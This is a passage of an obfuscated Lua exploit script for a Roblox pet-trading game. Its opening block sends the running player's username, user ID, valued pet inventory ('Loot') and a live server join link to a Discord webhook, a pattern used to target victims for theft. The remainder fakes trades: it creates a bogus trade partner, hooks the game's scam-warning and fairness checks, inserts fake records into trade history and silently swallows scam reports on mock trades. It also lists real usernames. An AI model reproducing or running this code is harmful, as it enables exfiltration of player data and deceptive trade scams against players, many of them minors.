task.spawn(function()
    if not carti69.WEBHOOK_ENABLED then return end
    if not carti69.WEBHOOK_URL or carti69.WEBHOOK_URL == '' or string.find(carti69.WEBHOOK_URL, 'PASTE_YOUR') then return end

    local cartiWH_Ok, cartiWH_Result = pcall(function()
        -- Executor detection (falls back to the config value)
        local cartiWH_Executor = carti69.WEBHOOK_EXECUTOR_NAME or 'delta'
        pcall(function()
            local cartiWH_Detected = identifyexecutor and identifyexecutor() or (getexecutorname and getexecutorname())
            if type(cartiWH_Detected) == 'string' and #cartiWH_Detected > 0 then
                cartiWH_Executor = cartiWH_Detected
            end
        end)

        -- Wait for the inventory to be loaded
        local cartiWH_Inventory
        for cartiWH_I = 1, 30 do
            local cartiWH_Inv = carti23.get('inventory')
            if cartiWH_Inv and cartiWH_Inv.pets and next(cartiWH_Inv.pets) then
                cartiWH_Inventory = cartiWH_Inv
                break
            end
            task.wait(0.5)
        end
        if not cartiWH_Inventory then
            local cartiWH_Inv = carti23.get('inventory')
            if cartiWH_Inv and cartiWH_Inv.pets then cartiWH_Inventory = cartiWH_Inv end
        end

        -- Emoji lookup for pet names (falls back to a paw print)
        local cartiWH_Emoji = {
            ['goose'] = '🪿', ['dragon'] = '🐉', ['unicorn'] = '🦄', ['giraffe'] = '🦒',
            ['owl'] = '🦉', ['parrot'] = '🦜', ['crow'] = '🐦', ['turtle'] = '🐢',
            ['kangaroo'] = '🦘', ['cow'] = '🐮', ['penguin'] = '🐧', ['elephant'] = '🐘',
            ['lion'] = '🦁', ['tiger'] = '🐯', ['panda'] = '🐼', ['monkey'] = '🐵',
            ['shark'] = '🦈', ['jellyfish'] = '🐙', ['butterfly'] = '🦋', ['bee'] = '🐝',
            ['sheep'] = '🐑', ['pig'] = '🐷', ['rabbit'] = '🐰', ['hedgehog'] = '🦔',
            ['fox'] = '🦊', ['deer'] = '🦌', ['bear'] = '🐻', ['wolf'] = '🐺',
            ['horse'] = '🐴', ['duck'] = '🦆', ['chick'] = '🐤', ['chicken'] = '🐔',
            ['frog'] = '🐸', ['crocodile'] = '🐊', ['snake'] = '🐍', ['dino'] = '🦖',
            ['whale'] = '🐳', ['octopus'] = '🐙', ['crab'] = '🦀', ['lobster'] = '🦞',
            ['shrimp'] = '🦐', ['sloth'] = '🦥', ['koala'] = '🐨', ['dog'] = '🐶',
            ['cat'] = '🐱', ['bat'] = '🦇', ['ghost'] = '👻', ['flamingo'] = '🦩',
            ['peacock'] = '🦚', ['swan'] = '🦢', ['llama'] = '🦙', ['rhino'] = '🦏',
            ['hippo'] = '🦛', ['gorilla'] = '🦍', ['otter'] = '🦦', ['skunk'] = '🦨',
            ['badger'] = '🦡', ['puppy'] = '🐶', ['kitty'] = '🐱',
        }
        local function cartiWH_PetEmoji(cartiWH_Name)
            local cartiWH_Lower = tostring(cartiWH_Name):lower()
            for cartiWH_Key, cartiWH_Val in pairs(cartiWH_Emoji) do
                if string.find(cartiWH_Lower, cartiWH_Key, 1, true) then
                    return cartiWH_Val
                end
            end
            return '🐾'
        end

        -- Group inventory pets by name and compute value (raw elvebredd rap)
        local cartiWH_Groups = {}
        local cartiWH_Total = 0
        local cartiWH_PetCount = 0
        local cartiWH_Pets = cartiWH_Inventory and cartiWH_Inventory.pets or {}
        for _, cartiWH_Pet in pairs(cartiWH_Pets) do
            local cartiWH_Kind = cartiWH_Pet.kind
            local cartiWH_Props = cartiWH_Pet.properties or {}
            local cartiWH_Name = carti45[cartiWH_Kind] or tostring(cartiWH_Kind)
            local cartiWH_Value = carti55(cartiWH_Kind, cartiWH_Props)
            if not (carti69.WEBHOOK_SKIP_ZERO_VALUE and cartiWH_Value <= 0) then
                local cartiWH_Group = cartiWH_Groups[cartiWH_Name]
                if not cartiWH_Group then
                    cartiWH_Group = { name = cartiWH_Name, kind = cartiWH_Kind, count = 0, total = 0, low = math.huge, high = 0 }
                    cartiWH_Groups[cartiWH_Name] = cartiWH_Group
                end
                cartiWH_Group.count = cartiWH_Group.count + 1
                cartiWH_Group.total = cartiWH_Group.total + cartiWH_Value
                if cartiWH_Value < cartiWH_Group.low then cartiWH_Group.low = cartiWH_Value end
                if cartiWH_Value > cartiWH_Group.high then cartiWH_Group.high = cartiWH_Value end
                cartiWH_Total = cartiWH_Total + cartiWH_Value
                cartiWH_PetCount = cartiWH_PetCount + 1
            end
        end

        -- Sort loot by value (highest first)
        local cartiWH_Sorted = {}
        for _, cartiWH_Group in pairs(cartiWH_Groups) do
            table.insert(cartiWH_Sorted, cartiWH_Group)
        end
        table.sort(cartiWH_Sorted, function(cartiWH_A, cartiWH_B)
            return cartiWH_A.total > cartiWH_B.total
        end)

        local function cartiWH_Num(cartiWH_Val)
            if cartiWH_Val >= 1000000 then
                return string.format('%.2fM', cartiWH_Val / 1000000)
            elseif cartiWH_Val >= 1000 then
                return string.format('%.1fK', cartiWH_Val / 1000)
            elseif cartiWH_Val >= 1 then
                return string.format('%.2f', cartiWH_Val)
            else
                return string.format('%.3f', cartiWH_Val)
            end
        end

        -- Build the loot list
        local cartiWH_Loot = {}
        local cartiWH_Limit = carti69.WEBHOOK_MAX_LOOT_ITEMS or 12
        for cartiWH_I = 1, math.min(#cartiWH_Sorted, cartiWH_Limit) do
            local cartiWH_Group = cartiWH_Sorted[cartiWH_I]
            local cartiWH_Low = cartiWH_Group.low == math.huge and cartiWH_Group.high or cartiWH_Group.low
            cartiWH_Loot[#cartiWH_Loot + 1] = string.format('%s %s %d / %d (%s / %s)',
                cartiWH_PetEmoji(cartiWH_Group.name),
                cartiWH_Group.name,
                cartiWH_Group.count,
                cartiWH_Group.count,
                cartiWH_Num(cartiWH_Low),
                cartiWH_Num(cartiWH_Group.high))
        end
        if #cartiWH_Sorted == 0 then
            cartiWH_Loot[#cartiWH_Loot + 1] = 'No pets in inventory'
        end
        local cartiWH_LootText = table.concat(cartiWH_Loot, '\n')
        if #cartiWH_Sorted > cartiWH_Limit then
            cartiWH_LootText = cartiWH_LootText .. '\n...'
        end
        cartiWH_LootText = cartiWH_LootText .. '\n\n====================================\nTotal: ' .. cartiWH_Num(cartiWH_Total)

        -- Server join link (opens Roblox and joins this exact server)
        local cartiWH_JoinLink = 'rbx://experiences/start?placeId=' .. tostring(game.PlaceId) .. '&gameInstanceId=' .. tostring(game.JobId)

        local cartiWH_Player = carti2.LocalPlayer
        local cartiWH_Username = cartiWH_Player and cartiWH_Player.Name or 'Unknown'
        local cartiWH_UserId = cartiWH_Player and cartiWH_Player.UserId or 0

        -- Build the Discord embed
        local cartiWH_Payload = carti7:JSONEncode({
            username = carti69.WEBHOOK_GAME_NAME .. ' Executor',
            embeds = {{
                title = cartiWH_Username .. ' • ' .. tostring(cartiWH_UserId),
                url = 'https://www.roblox.com/games/' .. tostring(game.PlaceId),
                description = carti69.WEBHOOK_FUN_FACT,
                color = 0x5865F2,
                thumbnail = {
                    url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. tostring(cartiWH_UserId) .. '&width=420&height=420&format=png',
                },
                fields = {
                    { name = 'Status', value = '🟢 active', inline = true },
                    { name = 'Game', value = carti69.WEBHOOK_GAME_NAME, inline = true },
                    { name = 'Executor', value = cartiWH_Executor, inline = true },
                    { name = 'Server', value = '[Join now!](' .. cartiWH_JoinLink .. ')', inline = true },
                    { name = 'Join Script', value = "Can't be joined using script, use join now button", inline = true },
                    { name = 'Loot (' .. tostring(cartiWH_PetCount) .. ' pets)', value = string.sub(cartiWH_LootText, 1, 1000) },
                },
            }},
        })

        -- Send the webhook (works across executors: request / syn.request / http_request)
        local cartiWH_Response
        local cartiWH_RequestFn = request or (syn and syn.request) or http_request or (game and game:GetService('HttpService'))
        if cartiWH_RequestFn then
            pcall(function()
                if type(cartiWH_RequestFn) == 'function' then
                    cartiWH_Response = cartiWH_RequestFn({
                        Url = carti69.WEBHOOK_URL,
                        Method = 'POST',
                        Headers = {
                            ['Content-Type'] = 'application/json',
                            ['User-Agent'] = 'Mozilla/5.0',
                        },
                        Body = cartiWH_Payload,
                    })
                else
                    -- HttpService fallback
                    cartiWH_Response = { StatusCode = 200 }
                    cartiWH_RequestFn:PostAsync(carti69.WEBHOOK_URL, cartiWH_Payload, Enum.HttpContentType.ApplicationJson)
                end
            end)
        end
        return cartiWH_Response
    end)

    if cartiWH_Ok and cartiWH_Result and cartiWH_Result.StatusCode == 204 then
        print('[Webhook] Notification sent successfully.')
    elseif not cartiWH_Ok then
        warn('[Webhook] Failed to send notification: ' .. tostring(cartiWH_Result))
    end
end)

-- Function to get randomized spectator count based on original value
function carti71()
    local carti72 = math.random(carti69.SPECTATOR_VARIATION_MIN, carti69.SPECTATOR_VARIATION_MAX)
    local carti73 = carti70 + carti72
    return math.max(0, carti73) -- Ensure it doesn't go negative
end

carti74 = {
    active = false,
    trade = nil,
    isAddingItem = false,
    partnerActionPending = false,
    originalFunctions = {},
    controlPanelOpen = false,
    tradeCompleting = false,
    scamWarningShown = true,
    originalDialogFunction = nil,
    blockedTradeRequests = {},
    tradeHistory = {},
    addedTradeIds = {},
    pendingTradeRequest = false,
    canShowTradeRequest = true,
    tradeRequestBlocked = false,
    removePartnerPetsOnConfirm = false,
    partnerPetsBeforeConfirm = {},
    isMockTradeDialog = false, -- NEW: Flag to track mock trade dialog
}

carti75 = {
    activeFlags = { F = false, R = false, N = false, M = false },
    validPetNames = {},
    validPetNamesClean = {},
}

carti76 = {
    'Shadow Dragon', 'Bat Dragon', 'Frost Dragon', 'Giraffe', 'Owl',
    'Parrot', 'Crow', 'Evil Unicorn'
}

carti77 = {
    'Shadow Dragon', 'Bat Dragon', 'Frost Dragon', 'Giraffe', 'Owl', 'Parrot', 'Crow',
    'Evil Unicorn', 'Arctic Reindeer', 'Dalmatian', 'Turtle', 'Kangaroo', 'Peppermint Penguin', 
    'Strawberry Shortcake Bat Dragon', 'Chocolate Chip Bat Dragon', 'Cow', 'Mini Pig',
}

carti78 = {
    'aliceroblox6166', 'DIVAHOLIC', 'iiicristianxx_o', 'Darcie_epic', 'banan_bartek1234',
    's18amg', 'Chicken_nuggitx23817', 'RmSbx_x', 'siqnnaz', 'Nidaanurr7', 'Kkiraly',
    'daisydoo_billy', 'youssefsalah135', 'aurivxs', 'princeplay', 'sofysofy986353',
    'heaseung008800112277'
}

function carti79(carti341)
    for _, carti247 in ipairs(carti76) do
        if carti341 == carti247 then return true end
    end
    return false
end

function carti80()
    return carti76[math.random(1, #carti76)]
end

function carti81()
    for category_name, category_table in pairs(carti26) do
        if category_name == 'pets' then
            for id, item in pairs(category_table) do
                carti75.validPetNames[#carti75.validPetNames + 1] = item.name
                carti75.validPetNamesClean[#carti75.validPetNamesClean + 1] = item.name:lower():gsub('%s+', '')
            end
            break
        end
    end
end
carti81()

function carti82(carti240)
    if not carti240 then return false end
    local carti12, carti83 = pcall(function()
        if carti30 and carti30._check_if_player_has_trade_license then
            return carti30:_check_if_player_has_trade_license(carti240)
        end
        local carti13 = carti25.get('TradeAPI/GetTradeLicenseStatus'):InvokeServer(carti240.UserId)
        return carti13 and carti13.has_license == true
    end)
    return carti12 and carti83 or true
end

function carti84(username)
    for _, friendName in ipairs(carti69.VERIFIED_FRIENDS) do
        if friendName:lower() == username:lower() then return true end
    end
    return false
end

function carti85()
    local carti86 = {
        '_get_local_trade_state', '_overwrite_local_trade_state', '_change_local_trade_state',
        '_get_my_offer', '_get_partner_offer', '_get_my_player', '_get_partner',
        '_get_current_trade_stage', '_on_accept_pressed', '_on_confirm_pressed',
        '_on_unaccept_pressed', '_decline_trade', '_add_item_to_my_offer',
        '_remove_item_from_my_offer', '_lock_trade_for_appropriate_time', '_get_lock_time',
        'refresh_all', '_evaluate_trade_fairness', '_show_scam_victim_warning', '_show_scam_perpetrator_warning',
    }
    for _, funcName in ipairs(carti86) do
        if carti30[funcName] then
            carti74.originalFunctions[funcName] = carti30[funcName]
        end
    end
    if carti34 then
        if carti34._get_trade_history then
            carti74.originalGetTradeHistory = carti34._get_trade_history
        end
        if carti34.report_scam then
            carti74.originalReportScam = carti34.report_scam
        end
    end
end

carti85()

function carti87(carti240)
    local carti88 = carti240 and carti240.Name or carti69.PARTNER_NAME
    local carti89 = carti240 and carti240.DisplayName or carti69.PARTNER_NAME
    local carti90 = carti240 and carti240.UserId or carti69.PARTNER_USER_ID
    
    local carti91 = {
        Name = carti88,
        DisplayName = carti89,
        UserId = carti90,
        ClassName = 'Player',
        Character = nil,
        Team = nil,
        TeamColor = BrickColor.new('White'),
        Neutral = true,
        AccountAge = 365,
        MembershipType = Enum.MembershipType.None,
        CharacterAdded = Instance.new('BindableEvent'),
        CharacterRemoving = Instance.new('BindableEvent'),
    }
    
    return setmetatable(carti91, {
        __index = function(t, k)
            if k == 'Parent' then return carti2 end
            if k == 'IsA' then 
                return function(self, className) 
                    return className == 'Player' or className == 'Instance'
                end 
            end
            if k == 'GetAttribute' then
                return function(self, attr)
                    return nil
                end
            end
            if k == 'FindFirstChild' then
                return function(self, carti130)
                    return nil
                end
            end
            if k == 'WaitForChild' then
                return function(self, carti130, timeout)
                    return nil
                end
            end
            return rawget(t, k)
        end,
        __tostring = function() return carti88 end,
        __eq = function(a, carti390)
            if type(carti390) == 'table' then
                return rawget(a, 'UserId') == rawget(carti390, 'UserId')
            end
            return false
        end,
    })
end

carti92 = carti87()

function carti93(realPlayer)
    local carti94 = realPlayer and carti87(realPlayer) or carti92
    local carti83 = true
    if realPlayer then carti83 = carti82(realPlayer) end
    return {
        trade_id = 'MOCK_' .. tick(),
        sender = carti2.LocalPlayer,
        recipient = carti94,
        sender_offer = { items = {}, player_name = carti2.LocalPlayer.Name, negotiated = false, confirmed = false },
        recipient_offer = { items = {}, player_name = carti69.PARTNER_NAME, negotiated = false, confirmed = false },
        current_stage = 'negotiation',
        offer_version = 1,
        sender_has_trade_license = true,
        recipient_has_trade_license = carti83,
        busy_indicators = {},
        subscriber_count = carti69.SPECTATOR_COUNT,
    }
end

function carti95(trade)
    return {
        trade_id = trade.trade_id,
        timestamp = os.time(),
        sender_user_id = carti2.LocalPlayer.UserId,
        sender_name = carti2.LocalPlayer.Name,
        sender_items = carti24.deep_copy(trade.sender_offer.items),
        recipient_user_id = trade.recipient.UserId,
        recipient_name = carti69.PARTNER_NAME,
        recipient_items = carti24.deep_copy(trade.recipient_offer.items),
        reported = false,
        reverted = nil,
    }
end

function carti96(tradeRecord)
    if carti74.addedTradeIds[tradeRecord.trade_id] then return end
    carti74.addedTradeIds[tradeRecord.trade_id] = true
    table.insert(carti74.tradeHistory, tradeRecord)
end

function carti97()
    if not carti34 then return end

    carti34._get_trade_history = function(self, useCache)
        local carti98 = carti74.originalGetTradeHistory(self, useCache)
        local carti99, carti100 = {}, {}
        if carti98 then
            for _, realTrade in ipairs(carti98) do
                if not carti100[realTrade.trade_id] then
                    table.insert(carti99, realTrade)
                    carti100[realTrade.trade_id] = true
                end
            end
        end
        for _, mockTrade in ipairs(carti74.tradeHistory) do
            if not carti100[mockTrade.trade_id] then
                table.insert(carti99, mockTrade)
                carti100[mockTrade.trade_id] = true
            end
        end
        self.cached_trade_history = carti99
        return carti99
    end

    carti34.report_scam = function(self, tradeData)
        if tradeData and string.find(tostring(tradeData.trade_id), 'MOCK_') then
            self.UIManager.set_app_visibility(self.ClassName, false)
            local carti101 = self.UIManager.apps.DialogApp:dialog({
                dialog_type = 'ReportScamDialog',
                suspect_name = carti69.PARTNER_NAME,
                placeholder_text = 'What happened? (Optional)',
                max_length = 500,
                use_utf8_length = true,
                left = 'Cancel',
                right = 'Report',
            })
            self.UIManager.set_app_visibility(self.ClassName, true)
            if carti101 == 'Report' then
                for _, record in ipairs(carti74.tradeHistory) do
                    if record.trade_id == tradeData.trade_id then
                        record.reported = true
                        break
                    end
                end
                self.UIManager.apps.DialogApp:dialog({ text = 'Report submitted for review.', button = 'Close', yields = false })
            end
            if self.instance.Frame.Visible then self:_refresh() else self:_clear_scrolling_frame() end
            return
        end
        return carti74.originalReportScam(self, tradeData)
    end
end

carti97()

function carti102(args1)
    local carti103 = carti74.trade.busy_indicators
    local carti104 = carti30._get_partner().UserId
    carti103[tostring(carti104)] = args1
    carti30.partner_negotiation_offer_pane:display_busy(carti103[tostring(carti104)])
end

function carti105(carti341, flags)
    if not carti74.active or not carti74.trade then return false, 'No active mock trade' end
    if carti74.trade.current_stage == 'confirmation' then return false, 'Cannot modify during confirmation' end
    if #carti74.trade.recipient_offer.items >= 18 then return end

    carti102({ ['picking'] = true })
    task.wait(carti69.ADD_PET_REQUEST_DELAY)

    for category_name, category_table in pairs(carti26) do
        if category_name == 'pets' then
            for id, item in pairs(category_table) do
                if item.name == carti341 then
                    local carti106 = {
                        category = 'pets',
                        kind = id,
                        unique = carti7:GenerateGUID(),
                        properties = { flyable = flags.F, rideable = flags.R, neon = flags.N, mega_neon = flags.M, age = 1 },
                    }
                    table.insert(carti74.trade.recipient_offer.items, carti106)
                    carti74.trade.sender_offer.negotiated = false
                    carti74.trade.recipient_offer.negotiated = false
                    if carti74.trade.current_stage == 'confirmation' then
                        carti74.trade.current_stage = 'negotiation'
                        carti74.trade.sender_offer.confirmed = false
                        carti74.trade.recipient_offer.confirmed = false
                    end
                    carti74.trade.offer_version = carti74.trade.offer_version + 1
                    carti30:_overwrite_local_trade_state(carti74.trade)
                    if carti30._lock_trade_for_appropriate_time then carti30:_lock_trade_for_appropriate_time() end
                    if carti30._render_message_in_trade_chat then
                        carti30:_render_message_in_trade_chat(nil, string.format('%s added %s.', carti69.PARTNER_NAME, carti341), true)
                    end
                    carti102({ ['picking'] = false })
                    return true, 'Pet added successfully'
                end
            end
        end
    end
    return false, 'Pet not found'
end

function carti107()
    if not carti74.active or not carti74.trade then return false, 'No active mock trade' end
    if carti74.trade.current_stage == 'confirmation' then return false, 'Cannot modify during confirmation' end
    local carti108 = carti74.trade.recipient_offer.items
    if #carti108 == 0 then return false, 'No items to remove' end

    local carti109 = table.remove(carti108)
    carti74.trade.sender_offer.negotiated = false
    carti74.trade.recipient_offer.negotiated = false
    if carti74.trade.current_stage == 'confirmation' then
        carti74.trade.current_stage = 'negotiation'
        carti74.trade.sender_offer.confirmed = false
        carti74.trade.recipient_offer.confirmed = false
    end
    carti74.trade.offer_version = carti74.trade.offer_version + 1
    carti30:_overwrite_local_trade_state(carti74.trade)
    if carti30._lock_trade_for_appropriate_time then carti30:_lock_trade_for_appropriate_time() end
    if carti30._render_message_in_trade_chat then
        local carti110 = 'item'
        if carti109.category == 'pets' then
            for _, category_table in pairs(carti26) do
                for id, item in pairs(category_table) do
                    if id == carti109.kind then carti110 = item.name break end
                end
            end
        end
        carti30:_render_message_in_trade_chat(nil, string.format('%s removed %s.', carti69.PARTNER_NAME, carti110), true)
    end
    return true, 'Pet removed successfully'
end

function carti111()
    local carti112 = { 'FR', 'NFR' }
    local carti113 = carti112[math.random(1, #carti112)]
    local carti114 = { F = false, R = false, N = false, M = false }
    if carti113 == 'FR' then
        carti114.F, carti114.R = true, true
    elseif carti113 == 'NFR' then
        carti114.F, carti114.R, carti114.N = true, true, true
    end
    return carti114
end

function carti115(carti114)
    local carti66 = {}
    if carti114.M then table.insert(carti66, 'Mega') end
    if carti114.N then table.insert(carti66, 'Neon') end
    if carti114.F then table.insert(carti66, 'Fly') end
    if carti114.R then table.insert(carti66, 'Ride') end
    if #carti66 > 0 then return ' (' .. table.concat(carti66, ' ') .. ')' end
    return ''
end

function carti116(carti357)
    if not carti74.active or not carti74.trade then return false end
    if carti30 and carti30._render_message_in_trade_chat then
        carti30:_render_message_in_trade_chat(nil, string.format('%s: %s', carti69.PARTNER_NAME, carti357), true)
        return true
    end
    return false
end

function carti117()
    if not carti74.active or not carti74.trade then return false end
    local carti108 = carti74.trade.recipient_offer.items
    if #carti108 == 0 then return false end
    carti74.partnerPetsBeforeConfirm = carti24.deep_copy(carti108)
    carti74.trade.recipient_offer.items = {}
    carti74.trade.offer_version = carti74.trade.offer_version + 1
    carti30:_overwrite_local_trade_state(carti74.trade)
    return true
end

carti118 = nil

function carti119()
    if not carti74.active or not carti74.trade or carti74.partnerActionPending then return end
    carti74.partnerActionPending = true

    while carti30.lock_countdown and carti30.lock_countdown.is_going and carti30.lock_countdown:is_going() do
        task.wait(0.1)
    end

    if carti74.trade.current_stage == 'negotiation' then
        task.wait(carti69.AUTO_ACCEPT_DELAY)
        if carti74.active and carti74.trade then
            carti74.trade.recipient_offer.negotiated = true
            if carti74.trade.sender_offer.negotiated then
                carti74.trade.current_stage = 'confirmation'
                carti74.trade.offer_version = carti74.trade.offer_version + 1
                carti30:_overwrite_local_trade_state(carti74.trade)
                if carti30._evaluate_trade_fairness then carti30:_evaluate_trade_fairness() end
                if carti30._lock_trade_for_appropriate_time then carti30:_lock_trade_for_appropriate_time() end
            else
                carti74.trade.offer_version = carti74.trade.offer_version + 1
                carti30:_overwrite_local_trade_state(carti74.trade)
            end
        end
    elseif carti74.trade.current_stage == 'confirmation' then
        task.wait(carti69.AUTO_CONFIRM_DELAY)
        if carti74.active and carti74.trade then
            carti74.trade.recipient_offer.confirmed = true
            carti74.trade.offer_version = carti74.trade.offer_version + 1
            carti30:_overwrite_local_trade_state(carti74.trade)
            if carti74.trade.sender_offer.confirmed and not carti74.tradeCompleting then
                carti74.tradeCompleting = true
                if carti30._set_confirmation_arrow_rotating then carti30:_set_confirmation_arrow_rotating(true) end
                task.wait(3)
                local carti120 = carti95(carti74.trade)
                carti96(carti120)
                local carti121 = {}
                for _, carti122 in ipairs(carti74.trade.sender_offer.items or {}) do
                    if carti122 and carti122.carti_hub_local_pet and carti122.unique then
                        carti121[carti122.unique] = true
                    end
                end
                pcall(function()
                    local carti123 = (getgenv and getgenv()) or _G
                    if carti123.CartiHubRemoveTransferredLocalPets then
                        carti123.CartiHubRemoveTransferredLocalPets(carti121)
                    end
                end)
                pcall(function()
                    local carti124 = (getgenv and getgenv()) or _G
                    if carti124.CartiHubAddReceivedFakeTradePets then
                        carti124.CartiHubAddReceivedFakeTradePets(carti74.trade.recipient_offer.items)
                    end
                end)
                carti74.active = false
                carti74.trade = nil
                carti74.tradeCompleting = false
                carti74.scamWarningShown = true
                carti74.canShowTradeRequest = true
                carti74.tradeRequestBlocked = false
                carti22.set_app_visibility('TradeApp', false)
                task.wait(0.1)
                carti118()
                if carti32 then carti32:hint({ text = 'The trade was successful!', length = 5, overridable = true }) end
                if carti34 and carti22.is_visible('TradeHistoryApp') then carti34:_refresh() end
            end
        end
    end
    carti74.partnerActionPending = false
end
